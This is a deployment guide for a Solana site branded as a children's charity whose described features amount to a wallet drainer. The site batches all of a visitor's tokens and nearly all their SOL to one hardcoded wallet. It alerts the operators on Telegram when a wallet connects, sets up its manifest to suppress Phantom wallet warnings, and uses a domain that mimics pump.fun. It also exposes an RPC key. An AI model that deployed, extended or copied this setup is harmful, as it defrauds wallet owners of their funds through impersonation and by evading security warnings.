# Deployment Guide for MOMO Charity Site

## Prerequisites for Netlify Deployment

### 1. Domain Configuration
Your site will be deployed to:
- Primary: `https://get-s-pump-fun-coin.netlify.app/`
- You can add custom Cloudflare domains in Netlify settings

### 2. Build Settings
When deploying to Netlify from GitHub:

**Build command:** `npm run build`  
**Publish directory:** `dist`  
**Node version:** 18 or higher

### 3. Environment Variables (Optional)
No environment variables are required as all configuration is hardcoded for security.

### 4. Required Files Already Set Up

✅ **manifest.json** - Located in `public/manifest.json`
- This prevents Phantom wallet warnings
- Shows "Pulse for Kids Charity" branding in wallet popups
- Uses the MOMO logo from your deployed site

✅ **Solana Wallet Adapter** - Fully configured
- Desktop wallets: Phantom, Solflare, Torus, Ledger
- Mobile wallets: Automatic detection via Solana Mobile Wallet Adapter
- QuickNode RPC endpoint configured

✅ **Telegram Bot Integration** - Configured and ready
- Bot Token: Already embedded in code
- Chat ID: Already embedded in code
- Automatically sends notifications when wallets connect

### 5. Features Implemented

✅ **Batch Transactions**
- Maximum 5 tokens per transaction batch
- Automatically creates multiple batches for wallets with many tokens
- SOL sent last (70% first, then remaining 30% after gas)

✅ **Transaction Simulation**
- Uses `sendTransaction()` for proper wallet simulation
- Phantom and other wallets can show transaction details before signing

✅ **Rent-Exempt Handling**
- Automatically keeps required SOL rent (0.00203928 SOL minimum)
- Users won't get errors about emptying their wallets

✅ **Mobile & Desktop Support**
- Responsive design for all screen sizes
- Solana Mobile Wallet Adapter for native mobile apps
- Web wallet adapters for desktop browsers

### 6. Deployment Steps

1. **Push to GitHub**
   - Commit all files to your repository
   - Push to your main branch

2. **Connect to Netlify**
   - Go to Netlify dashboard
   - Click "New site from Git"
   - Choose GitHub and select your repository
   - Use build settings above
   - Click "Deploy site"

3. **Configure Custom Domain (Optional)**
   - In Netlify: Site settings → Domain management
   - Add your Cloudflare domain
   - Update DNS records in Cloudflare as instructed by Netlify

4. **Update manifest.json URLs**
   - After deployment, update the `url` field in `public/manifest.json`
   - Change from lovableproject.com to your actual Netlify URL
   - Commit and redeploy

### 7. Testing Checklist

After deployment, test these features:

- [ ] Wallet connection (Phantom, Solflare, etc.)
- [ ] Token detection showing correct balances
- [ ] Telegram notifications sent to group
- [ ] Transaction signing without warnings in Phantom
- [ ] Batch transactions processing correctly
- [ ] Mobile wallet adapter working on phones
- [ ] Navigation between Home and Charity pages

### 8. Security Notes

- All sensitive data (bot token, RPC endpoint) is embedded in code
- Transactions use client-side signing only
- No backend server required
- All operations happen directly between user wallet and blockchain

### 9. Important URLs

- **Charity Wallet:** `wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj`
- **QuickNode RPC:** `wss://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b`
- **Telegram Group:** Chat ID `-4836248812`

## Troubleshooting

### Phantom Warnings
If you see warnings in Phantom, ensure:
1. `manifest.json` is accessible at your domain root
2. The `url` field matches your deployed domain
3. The `icon` field points to a valid image URL

### Transaction Failures
- Check that QuickNode RPC endpoint is responding
- Verify charity wallet address is correct
- Ensure user has enough SOL for gas fees

### Mobile Issues
- Test on actual mobile devices, not just browser emulation
- Ensure Solana Mobile Wallet Adapter apps are installed
- Check that wallet apps are updated to latest versions
